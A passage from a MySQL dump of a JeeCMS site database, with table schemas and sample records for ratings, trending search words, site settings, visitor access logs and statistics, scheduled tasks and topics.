INSERT INTO `jc_score_group` VALUES ('1', '心情组', '心情组', '0', '1', '1'), ('2', '星级评分', '星级评分', '1', '0', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_score_item`
-- ----------------------------
DROP TABLE IF EXISTS `jc_score_item`;
CREATE TABLE `jc_score_item` (
  `score_item_id` int(11) NOT NULL AUTO_INCREMENT,
  `score_group_id` int(11) NOT NULL COMMENT '评分组',
  `name` varchar(255) NOT NULL COMMENT '评分名',
  `score` int(11) NOT NULL COMMENT '分值',
  `image_path` varchar(255) DEFAULT NULL COMMENT '评分图标路径',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  PRIMARY KEY (`score_item_id`),
  KEY `fk_jc_score_item_group` (`score_group_id`),
  CONSTRAINT `fk_jc_score_item_group` FOREIGN KEY (`score_group_id`) REFERENCES `jc_score_group` (`score_group_id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8 COMMENT='评分项';

-- ----------------------------
--  Records of `jc_score_item`
-- ----------------------------
BEGIN;
INSERT INTO `jc_score_item` VALUES ('1', '1', '开心', '1', '/r/cms/smilies/m1.gif', '1'), ('2', '1', '板砖', '1', '/r/cms/smilies/m2.gif', '2'), ('3', '1', '感动', '1', '/r/cms/smilies/m3.gif', '3'), ('4', '1', '有用', '1', '/r/cms/smilies/m4.gif', '4'), ('5', '1', '疑问', '1', '/r/cms/smilies/m5.gif', '5'), ('6', '1', '难过', '1', '/r/cms/smilies/m6.gif', '6'), ('7', '1', '无聊', '1', '/r/cms/smilies/m7.gif', '7'), ('8', '1', '震惊', '1', '/r/cms/smilies/m8.gif', '8'), ('9', '2', '非常差', '1', '', '1'), ('10', '2', '差', '2', '', '2'), ('11', '2', '一般', '3', '', '3'), ('12', '2', '好', '4', '', '4'), ('13', '2', '非常好', '5', '', '5');
COMMIT;

-- ----------------------------
--  Table structure for `jc_score_record`
-- ----------------------------
DROP TABLE IF EXISTS `jc_score_record`;
CREATE TABLE `jc_score_record` (
  `score_record_id` int(11) NOT NULL AUTO_INCREMENT,
  `score_item_id` int(11) NOT NULL COMMENT '评分项',
  `content_id` int(11) NOT NULL COMMENT '内容',
  `score_count` int(11) NOT NULL COMMENT '评分次数',
  PRIMARY KEY (`score_record_id`),
  KEY `fk_jc_record_score_item` (`score_item_id`),
  KEY `index_score_record_content` (`content_id`),
  CONSTRAINT `fk_jc_record_score_item` FOREIGN KEY (`score_item_id`) REFERENCES `jc_score_item` (`score_item_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='评分纪录';

-- ----------------------------
--  Table structure for `jc_search_words`
-- ----------------------------
DROP TABLE IF EXISTS `jc_search_words`;
CREATE TABLE `jc_search_words` (
  `word_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '搜索词汇',
  `hit_count` int(11) NOT NULL DEFAULT '0' COMMENT '搜索次数',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '优先级',
  `name_initial` varchar(500) NOT NULL DEFAULT '' COMMENT '拼音首字母',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '推荐',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  PRIMARY KEY (`word_id`)
) ENGINE=InnoDB AUTO_INCREMENT=42 DEFAULT CHARSET=utf8 COMMENT='搜索热词';

-- ----------------------------
--  Records of `jc_search_words`
-- ----------------------------
BEGIN;
INSERT INTO `jc_search_words` VALUES ('1', '台湾地震', '6', '10', 'twdz', '1', '1'), ('5', '楼市', '65', '2', 'ls', '1', '1'), ('6', '四川', '2', '11', 'sc', '1', '1'), ('7', '黄金接连下跌', '13', '10', 'hjjlxd', '1', '1'), ('8', '里约奥运会', '2', '12', 'lyayh', '1', '1'), ('9', '电信诈骗', '23', '10', 'dxzp', '1', '1'), ('10', '雷洋案', '12', '11', 'lya', '1', '1'), ('13', '2015各行业平均工资', '9', '10', '2015gxypjgz', '1', '1'), ('14', '太阳的后裔', '10', '10', 'tydhy', '1', '1'), ('15', '广西 ', '1', '10', 'gx', '0', '1'), ('17', '莆田系', '17', '10', 'ptx', '1', '1'), ('18', '巴基斯坦', '1', '10', 'bjst', '0', '1'), ('21', '北京', '1', '10', 'bj', '0', '1'), ('29', '中级java工程师', '1', '10', 'zjjavagcs', '0', '1'), ('30', '高考', '1', '10', 'gk', '0', '1'), ('31', '请输入关键词', '2', '10', 'qsrgjc', '0', '1'), ('32', '全文检索测试', '1', '10', 'qwjscs', '0', '1'), ('33', '草原天路收费', '3', '11', 'cytlsf', '1', '1'), ('34', '世界', '1', '10', 'sj', '0', '1'), ('35', 'jeecms', '1', '10', 'jeecms', '0', '1'), ('37', '涓浗寤鸿', '1', '10', '涓??寤h?', '0', '1'), ('38', '高考减招', '22', '10', 'gkjz', '1', '1'), ('39', '1234＃/', '1', '10', '1234＃/', '0', '1'), ('40', '李克强', '1', '10', 'lkq', '0', '1'), ('41', '年', '1', '10', 'n', '0', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_sensitivity`
-- ----------------------------
DROP TABLE IF EXISTS `jc_sensitivity`;
CREATE TABLE `jc_sensitivity` (
  `sensitivity_id` int(11) NOT NULL AUTO_INCREMENT,
  `search` varchar(255) NOT NULL COMMENT '敏感词',
  `replacement` varchar(255) NOT NULL COMMENT '替换词',
  PRIMARY KEY (`sensitivity_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS敏感词表';

-- ----------------------------
--  Records of `jc_sensitivity`
-- ----------------------------
BEGIN;
INSERT INTO `jc_sensitivity` VALUES ('1', '法论功', '***');
COMMIT;

-- ----------------------------
--  Table structure for `jc_site`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site`;
CREATE TABLE `jc_site` (
  `site_id` int(11) NOT NULL AUTO_INCREMENT,
  `config_id` int(11) NOT NULL COMMENT '配置ID',
  `ftp_upload_id` int(11) DEFAULT NULL COMMENT '上传ftp',
  `domain` varchar(50) NOT NULL COMMENT '域名',
  `site_path` varchar(20) NOT NULL COMMENT '路径',
  `site_name` varchar(100) NOT NULL COMMENT '网站名称',
  `short_name` varchar(100) NOT NULL COMMENT '简短名称',
  `protocol` varchar(20) NOT NULL DEFAULT 'http://' COMMENT '协议',
  `dynamic_suffix` varchar(10) NOT NULL DEFAULT '.jhtml' COMMENT '动态页后缀',
  `static_suffix` varchar(10) NOT NULL DEFAULT '.html' COMMENT '静态页后缀',
  `static_dir` varchar(50) DEFAULT NULL COMMENT '静态页存放目录',
  `is_index_to_root` char(1) NOT NULL DEFAULT '0' COMMENT '是否使用将首页放在根目录下',
  `is_static_index` char(1) NOT NULL DEFAULT '0' COMMENT '是否静态化首页',
  `locale_admin` varchar(10) NOT NULL DEFAULT 'zh_CN' COMMENT '后台本地化',
  `locale_front` varchar(10) NOT NULL DEFAULT 'zh_CN' COMMENT '前台本地化',
  `tpl_solution` varchar(50) NOT NULL DEFAULT 'default' COMMENT '模板方案',
  `final_step` tinyint(4) NOT NULL DEFAULT '2' COMMENT '终审级别',
  `after_check` tinyint(4) NOT NULL DEFAULT '2' COMMENT '审核后(1:不能修改删除;2:修改后退回;3:修改后不变)',
  `is_relative_path` char(1) NOT NULL DEFAULT '1' COMMENT '是否使用相对路径',
  `is_recycle_on` char(1) NOT NULL DEFAULT '1' COMMENT '是否开启回收站',
  `domain_alias` varchar(255) DEFAULT NULL COMMENT '域名别名',
  `domain_redirect` varchar(255) DEFAULT NULL COMMENT '域名重定向',
  `is_master` tinyint(1) DEFAULT '0' COMMENT '是否主站',
  `parent_id` int(11) DEFAULT NULL COMMENT '父站点id',
  `tpl_index` varchar(255) DEFAULT NULL COMMENT '首页模板',
  `access_path` varchar(50) DEFAULT NULL COMMENT '访问路径',
  `keywords` varchar(255) DEFAULT NULL COMMENT '站点关键字',
  `description` varchar(255) DEFAULT NULL COMMENT '站点描述',
  `tpl_mobile_solution` varchar(50) NOT NULL DEFAULT 'mobile' COMMENT '手机站模板方案',
  `mobile_static_dir` varchar(50) DEFAULT '/wap' COMMENT '手机站静态页存放目录',
  `mobile_static_sync` tinyint(1) NOT NULL DEFAULT '0' COMMENT '手机站静态页同步生成',
  `ftp_sync_page_id` int(11) DEFAULT NULL COMMENT '静态页同步FTP',
  `page_is_sync_ftp` tinyint(1) NOT NULL DEFAULT '0' COMMENT '静态页同步发布FTP',
  `resouce_is_sync_ftp` tinyint(1) NOT NULL DEFAULT '0' COMMENT '资源同步发布FTP',
  PRIMARY KEY (`site_id`),
  UNIQUE KEY `ak_domain_path` (`domain`,`access_path`),
  KEY `fk_jc_site_config` (`config_id`),
  KEY `fk_jc_site_upload_ftp` (`ftp_upload_id`),
  KEY `fk_jc_site_parent` (`parent_id`),
  CONSTRAINT `fk_jc_site_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`),
  CONSTRAINT `fk_jc_site_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_site_upload_ftp` FOREIGN KEY (`ftp_upload_id`) REFERENCES `jo_ftp` (`ftp_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS站点表';

-- ----------------------------
--  Records of `jc_site`
-- ----------------------------
BEGIN;
INSERT INTO `jc_site` VALUES ('1', '1', null, 'www.coachtam.cn', 'www', '科技综合管理系统', '科技综合管理系统', 'http://', '.jhtml', '.html', '/html', '0', '0', 'zh_CN', 'zh_CN', 'default', '3', '3', '0', '1', '', '', '1', null, '', '', '科技综合管理系统', '科技综合管理系统', 'mobile', '/wap', '0', null, '0', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_site_access`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access`;
CREATE TABLE `jc_site_access` (
  `access_id` int(11) NOT NULL AUTO_INCREMENT,
  `session_id` varchar(32) NOT NULL DEFAULT '',
  `site_id` int(11) NOT NULL COMMENT '站点id',
  `access_time` time NOT NULL COMMENT '访问时间',
  `access_date` date NOT NULL COMMENT '访问日期',
  `ip` varchar(50) NOT NULL DEFAULT '',
  `area` varchar(50) DEFAULT NULL COMMENT '访问地区',
  `access_source` varchar(255) DEFAULT NULL COMMENT '访问来源',
  `external_link` varchar(255) DEFAULT NULL COMMENT '外部链接网址',
  `engine` varchar(50) DEFAULT NULL COMMENT '搜索引擎',
  `entry_page` varchar(255) DEFAULT NULL COMMENT '入口页面',
  `last_stop_page` varchar(255) DEFAULT NULL COMMENT '最后停留页面',
  `visit_second` int(11) DEFAULT NULL COMMENT '访问时长(秒)',
  `visit_page_count` int(11) DEFAULT NULL COMMENT '访问页面数',
  `operating_system` varchar(50) DEFAULT NULL COMMENT '操作系统',
  `browser` varchar(50) DEFAULT NULL COMMENT '浏览器',
  `keyword` varchar(255) DEFAULT NULL COMMENT '来访关键字',
  PRIMARY KEY (`access_id`),
  KEY `fk_jc_access_site` (`site_id`),
  CONSTRAINT `fk_jc_access_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8 COMMENT='站点访问表';

-- ----------------------------
--  Records of `jc_site_access`
-- ----------------------------
BEGIN;
INSERT INTO `jc_site_access` VALUES ('17', 'BA467543A6D18684B08D8AC7E479B527', '1', '08:44:03', '2018-10-23', '182.246.11.197', '', '外部链接', 'http://www.coachtam.cn:8888', null, 'http://www.coachtam.cn:8888/honghe/', 'http://www.coachtam.cn:8888/honghe/', '0', '2', 'Win 7', 'chrome 67', ''), ('18', '092C708584574343BF1183E076BD0839', '1', '12:37:26', '2018-10-23', '39.128.162.98', '', '外部链接', 'http://www.coachtam.cn:8888', null, 'http://www.coachtam.cn:8888/honghe/', 'http://www.coachtam.cn:8888/honghe/tpxw/160.jhtml', '198', '2', 'WinNT', 'chrome 70', ''), ('19', '3D759603C7588653F10323D6280423E8', '1', '02:36:13', '2018-10-23', '182.246.11.197', '', '外部链接', 'http://www.coachtam.cn:8888', null, 'http://www.coachtam.cn:8888/honghe/', 'http://www.coachtam.cn:8888/honghe/', '0', '1', 'Win 7', 'chrome 67', ''), ('20', 'C67DA1F5E6FE328D40BD9AA5EE8E0BF7', '1', '04:43:46', '2018-10-23', '39.128.162.98', '', '外部链接', 'http://www.coachtam.cn:8888', null, 'http://www.coachtam.cn:8888/honghe/', 'http://www.coachtam.cn:8888/honghe/zhwd/index.jhtml', '653', '2', 'WinNT', 'chrome 70', ''), ('21', '5D5AB9FDF293F7046964DFEECAF81996', '1', '05:00:43', '2018-10-23', '39.128.162.98', '', '外部链接', 'http://www.coachtam.cn:8888', null, 'http://www.coachtam.cn:8888/honghe/', 'http://www.coachtam.cn:8888/honghe/', '132', '2', 'WinNT', 'chrome 70', ''), ('22', 'A5FEA256E5BAA1E69C971C935239178C', '1', '06:11:32', '2018-10-23', '110.184.80.250', '', '外部链接', 'http://www.coachtam.cn:8888', null, 'http://www.coachtam.cn:8888/honghe/', 'http://www.coachtam.cn:8888/honghe/', '585', '3', 'WinNT', 'chrome 57', '');
COMMIT;

-- ----------------------------
--  Table structure for `jc_site_access_count`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access_count`;
CREATE TABLE `jc_site_access_count` (
  `access_count` int(11) NOT NULL AUTO_INCREMENT,
  `page_count` int(11) NOT NULL DEFAULT '1' COMMENT '访问页数',
  `visitors` int(11) NOT NULL DEFAULT '0' COMMENT '用户数',
  `statistic_date` date NOT NULL COMMENT '统计日期',
  `site_id` int(11) NOT NULL COMMENT '统计站点',
  PRIMARY KEY (`access_count`),
  KEY `fk_jc_access_count_site` (`site_id`),
  CONSTRAINT `fk_jc_access_count_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=279 DEFAULT CHARSET=utf8 COMMENT='每日统计页数访问情况';

-- ----------------------------
--  Records of `jc_site_access_count`
-- ----------------------------
BEGIN;
INSERT INTO `jc_site_access_count` VALUES ('269', '1', '1', '2018-10-18', '1'), ('270', '4', '1', '2018-10-18', '1'), ('271', '1', '2', '2018-10-19', '1'), ('272', '2', '1', '2018-10-19', '1'), ('273', '13', '1', '2018-10-19', '1'), ('274', '2', '1', '2018-10-21', '1'), ('275', '37', '1', '2018-10-21', '1'), ('276', '2', '4', '2018-10-22', '1'), ('277', '1', '3', '2018-10-22', '1'), ('278', '70', '1', '2018-10-22', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_site_access_pages`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access_pages`;
CREATE TABLE `jc_site_access_pages` (
  `access_pages_id` int(11) NOT NULL AUTO_INCREMENT,
  `access_page` varchar(255) NOT NULL COMMENT '访问页面',
  `session_id` varchar(32) NOT NULL,
  `access_date` date NOT NULL COMMENT '访问日期',
  `access_time` time NOT NULL COMMENT '访问时间',
  `visit_second` int(11) NOT NULL DEFAULT '0' COMMENT '停留时长（秒）',
  `page_index` int(11) NOT NULL DEFAULT '0' COMMENT '用户访问页面的索引',
  `site_id` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`access_pages_id`),
  KEY `fk_jc_access_pages_access` (`session_id`)
) ENGINE=InnoDB AUTO_INCREMENT=32 DEFAULT CHARSET=utf8 COMMENT='访问详细页面表';

-- ----------------------------
--  Records of `jc_site_access_pages`
-- ----------------------------
BEGIN;
INSERT INTO `jc_site_access_pages` VALUES ('28', 'http://www.coachtam.cn:8888/honghe/', 'BA467543A6D18684B08D8AC7E479B527', '2018-10-23', '08:46:10', '0', '2', '1'), ('29', 'http://www.coachtam.cn:8888/honghe/', '092C708584574343BF1183E076BD0839', '2018-10-23', '12:39:33', '0', '1', '1'), ('30', 'http://www.coachtam.cn:8888/honghe/', 'C67DA1F5E6FE328D40BD9AA5EE8E0BF7', '2018-10-23', '04:45:53', '0', '1', '1'), ('31', 'http://www.coachtam.cn:8888/honghe/', '5D5AB9FDF293F7046964DFEECAF81996', '2018-10-23', '05:02:50', '0', '1', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_site_access_statistic`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access_statistic`;
CREATE TABLE `jc_site_access_statistic` (
  `access_statistic_id` int(11) NOT NULL AUTO_INCREMENT,
  `statistic_date` date NOT NULL COMMENT '统计日期',
  `pv` int(11) NOT NULL DEFAULT '0' COMMENT 'pv量',
  `ip` int(11) NOT NULL DEFAULT '0' COMMENT 'ip量',
  `visitors` int(11) NOT NULL DEFAULT '0' COMMENT '访客数量',
  `pages_aver` int(11) NOT NULL DEFAULT '0' COMMENT '人均浏览次数',
  `visit_second_aver` int(11) NOT NULL DEFAULT '0' COMMENT '人均访问时长（秒）',
  `site_id` int(11) NOT NULL COMMENT '站点id',
  `statisitc_type` varchar(255) NOT NULL DEFAULT 'all' COMMENT '统计分类（all代表当天所有访问量的统计）',
  `statistic_column_value` varchar(255) DEFAULT '' COMMENT '统计列值',
  PRIMARY KEY (`access_statistic_id`),
  KEY `fk_jc_access_statistic_site` (`site_id`),
  CONSTRAINT `fk_jc_access_statistic_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=370 DEFAULT CHARSET=utf8 COMMENT='访问统计表';

-- ----------------------------
--  Records of `jc_site_access_statistic`
-- ----------------------------
BEGIN;
INSERT INTO `jc_site_access_statistic` VALUES ('357', '2018-10-18', '5', '1', '2', '2', '1345', '1', 'all', ''), ('358', '2018-10-18', '5', '1', '2', '2', '1345', '1', 'source', '外部链接'), ('359', '2018-10-18', '5', '1', '2', '2', '1345', '1', 'link', 'http://localhost:8080'), ('360', '2018-10-19', '17', '2', '4', '4', '439', '1', 'all', ''), ('361', '2018-10-19', '17', '2', '4', '4', '439', '1', 'source', '外部链接'), ('362', '2018-10-19', '4', '1', '3', '1', '76', '1', 'link', 'http://localhost:8080'), ('363', '2018-10-19', '13', '1', '1', '13', '1530', '1', 'link', 'http://www.coachtam.cn:8888'), ('364', '2018-10-21', '39', '1', '2', '19', '763', '1', 'all', ''), ('365', '2018-10-21', '39', '1', '2', '19', '763', '1', 'source', '外部链接'), ('366', '2018-10-21', '39', '1', '2', '19', '763', '1', 'link', 'http://www.coachtam.cn:8888'), ('367', '2018-10-22', '81', '4', '8', '10', '488', '1', 'all', ''), ('368', '2018-10-22', '81', '4', '8', '10', '488', '1', 'source', '外部链接'), ('369', '2018-10-22', '81', '4', '8', '10', '488', '1', 'link', 'http://www.coachtam.cn:8888');
COMMIT;

-- ----------------------------
--  Table structure for `jc_site_attr`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_attr`;
CREATE TABLE `jc_site_attr` (
  `site_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_site` (`site_id`),
  CONSTRAINT `fk_jc_attr_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点属性表';

-- ----------------------------
--  Records of `jc_site_attr`
-- ----------------------------
BEGIN;
INSERT INTO `jc_site_attr` VALUES ('1', 'pvTotal', '105'), ('1', 'visitors', '31'), ('1', 'wxAppkey', '0'), ('1', 'wxAppSecret', '0'), ('1', 'dayPvTotal', '8'), ('1', 'dayVisitors', '9'), ('1', 'weekPvTotal', '94'), ('1', 'monthPvTotal', '105'), ('1', 'monthVisitors', '31'), ('1', 'weekVisitors', '25');
COMMIT;

-- ----------------------------
--  Table structure for `jc_site_cfg`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_cfg`;
CREATE TABLE `jc_site_cfg` (
  `site_id` int(11) NOT NULL,
  `cfg_name` varchar(30) NOT NULL COMMENT '名称',
  `cfg_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_cfg_site` (`site_id`),
  CONSTRAINT `fk_jc_cfg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点配置表';

-- ----------------------------
--  Table structure for `jc_site_company`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_company`;
CREATE TABLE `jc_site_company` (
  `site_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL COMMENT '公司名称',
  `scale` varchar(255) DEFAULT NULL COMMENT '公司规模',
  `nature` varchar(255) DEFAULT NULL COMMENT '公司性质',
  `industry` varchar(1000) DEFAULT NULL COMMENT '公司行业',
  `contact` varchar(500) DEFAULT NULL COMMENT '联系方式',
  `description` text COMMENT '公司简介',
  `address` varchar(500) DEFAULT NULL COMMENT '公司地址',
  `longitude` float(5,2) DEFAULT NULL COMMENT '经度',
  `latitude` float(4,2) DEFAULT NULL COMMENT '纬度',
  PRIMARY KEY (`site_id`),
  CONSTRAINT `fk_jc_company_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='公司信息';

-- ----------------------------
--  Records of `jc_site_company`
-- ----------------------------
BEGIN;
INSERT INTO `jc_site_company` VALUES ('1', '中国人民银行', '100人以上', '国企', '互联网', '', '', '', null, null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_site_model`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_model`;
CREATE TABLE `jc_site_model` (
  `model_id` int(11) NOT NULL AUTO_INCREMENT,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `model_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `upload_path` varchar(100) DEFAULT NULL COMMENT '上传路径',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) DEFAULT '1' COMMENT '0:编辑器;1:文本框;2:文本区;3:图片;4:附件',
  `is_single` tinyint(1) DEFAULT '1' COMMENT '是否独占一行',
  PRIMARY KEY (`model_id`),
  UNIQUE KEY `ak_field` (`field`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点信息模型表';

-- ----------------------------
--  Table structure for `jc_site_refer`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_refer`;
CREATE TABLE `jc_site_refer` (
  `site_id` int(11) NOT NULL,
  `from_site_id` int(11) NOT NULL,
  PRIMARY KEY (`from_site_id`,`site_id`),
  KEY `fk_jc_site_to` (`site_id`),
  CONSTRAINT `fk_jc_site_from` FOREIGN KEY (`from_site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_site_to` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='站点转载权限';

-- ----------------------------
--  Records of `jc_site_refer`
-- ----------------------------
BEGIN;
INSERT INTO `jc_site_refer` VALUES ('1', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_site_txt`
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_txt`;
CREATE TABLE `jc_site_txt` (
  `site_id` int(11) NOT NULL,
  `txt_name` varchar(30) NOT NULL COMMENT '名称',
  `txt_value` longtext COMMENT '值',
  KEY `fk_jc_txt_site` (`site_id`),
  CONSTRAINT `fk_jc_txt_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点文本表';

-- ----------------------------
--  Table structure for `jc_task`
-- ----------------------------
DROP TABLE IF EXISTS `jc_task`;
CREATE TABLE `jc_task` (
  `task_id` int(11) NOT NULL AUTO_INCREMENT,
  `task_code` varchar(255) DEFAULT NULL COMMENT '任务执行代码',
  `task_type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '任务类型(1首页静态化、2栏目页静态化、3内容页静态化、4采集、5分发)',
  `task_name` varchar(255) NOT NULL COMMENT '任务名称',
  `job_class` varchar(255) NOT NULL COMMENT '任务类',
  `execycle` tinyint(1) NOT NULL DEFAULT '1' COMMENT '执行周期分类(1非表达式 2 cron表达式)',
  `day_of_month` int(11) DEFAULT NULL COMMENT '每月的哪天',
  `day_of_week` tinyint(1) DEFAULT NULL COMMENT '周几',
  `hour` int(11) DEFAULT NULL COMMENT '小时',
  `minute` int(11) DEFAULT NULL COMMENT '分钟',
  `interval_hour` int(11) DEFAULT NULL COMMENT '间隔小时',
  `interval_minute` int(11) DEFAULT NULL COMMENT '间隔分钟',
  `task_interval_unit` tinyint(1) DEFAULT NULL COMMENT '1分钟、2小时、3日、4周、5月',
  `cron_expression` varchar(255) DEFAULT NULL COMMENT '规则表达式',
  `is_enable` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  `task_remark` varchar(255) DEFAULT NULL COMMENT '任务说明',
  `site_id` int(11) NOT NULL COMMENT '站点',
  `user_id` int(11) NOT NULL COMMENT '创建者',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  PRIMARY KEY (`task_id`),
  KEY `fk_jc_task_site` (`site_id`),
  CONSTRAINT `fk_jc_task_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='任务表';

-- ----------------------------
--  Records of `jc_task`
-- ----------------------------
BEGIN;
INSERT INTO `jc_task` VALUES ('3', '3d648c5b-3815-4e34-9a90-888c02d54e6e', '1', '11', 'com.jeecms.cms.task.job.IndexStaticJob', '1', null, null, null, null, null, '1', '1', null, '0', '', '1', '1', '2016-06-25 10:40:07');
COMMIT;

-- ----------------------------
--  Table structure for `jc_task_attr`
-- ----------------------------
DROP TABLE IF EXISTS `jc_task_attr`;
CREATE TABLE `jc_task_attr` (
  `task_id` int(11) NOT NULL,
  `param_name` varchar(30) NOT NULL COMMENT '参数名称',
  `param_value` varchar(255) DEFAULT NULL COMMENT '参数值',
  KEY `fk_jc_attr_task` (`task_id`),
  CONSTRAINT `fk_jc_attr_task` FOREIGN KEY (`task_id`) REFERENCES `jc_task` (`task_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='任务参数表';

-- ----------------------------
--  Records of `jc_task_attr`
-- ----------------------------
BEGIN;
INSERT INTO `jc_task_attr` VALUES ('3', 'site_id', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_third_account`
-- ----------------------------
DROP TABLE IF EXISTS `jc_third_account`;
CREATE TABLE `jc_third_account` (
  `account_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `account_key` varchar(255) NOT NULL DEFAULT '' COMMENT '第三方账号key',
  `username` varchar(100) NOT NULL DEFAULT '0' COMMENT '关联用户名',
  `source` varchar(10) NOT NULL DEFAULT '' COMMENT '第三方账号平台(QQ、新浪微博等)',
  `user_id` int(11) DEFAULT NULL COMMENT '用户iD',
  PRIMARY KEY (`account_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='第三方登录平台账号';

-- ----------------------------
--  Table structure for `jc_topic`
-- ----------------------------
DROP TABLE IF EXISTS `jc_topic`;
CREATE TABLE `jc_topic` (
  `topic_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_id` int(11) DEFAULT NULL,
  `topic_name` varchar(150) NOT NULL COMMENT '名称',
  `short_name` varchar(150) DEFAULT NULL COMMENT '简称',
  `keywords` varchar(255) DEFAULT NULL COMMENT '关键字',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `title_img` varchar(100) DEFAULT NULL COMMENT '标题图',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '专题模板',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推??',
  PRIMARY KEY (`topic_id`),
  KEY `fk_jc_topic_channel` (`channel_id`),
  CONSTRAINT `fk_jc_topic_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='CMS专题表';

-- ----------------------------
--  Records of `jc_topic`
-- ----------------------------
BEGIN;
INSERT INTO `jc_topic` VALUES ('1', null, ' 2016饲料英才网络招聘会', '饲料英才网络招聘会', '', '', '/u/cms/www/201610/10100951y2xy.jpg', '/u/cms/www/201610/11092540p27t.jpg', '', '11', '1'), ('2', null, '互联网+与传统产业升级之道', '互联网+', '', '', '/u/cms/www/201610/10100842hqdk.jpg', '/u/cms/www/201610/110911592mxa.jpg', '', '10', '1'), ('3', null, '2015全国两会', '2015全国两会', '', '', '/u/cms/www/201610/101010021q7v.jpg', '/u/cms/www/201610/11092148co74.jpg', '', '10', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_topic_channel`
-- ----------------------------
DROP TABLE IF EXISTS `jc_topic_channel`;
CREATE TABLE `jc_topic_channel` (
  `topic_id` int(11) NOT NULL,
  `channel_id` int(11) NOT NULL,
  PRIMARY KEY (`topic_id`,`channel_id`),
  KEY `fk_jc_topic_channel_channel` (`channel_id`),
  KEY `fk_jc_topic_channel_topic` (`topic_id`),
  CONSTRAINT `fk_jc_topic_channel_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
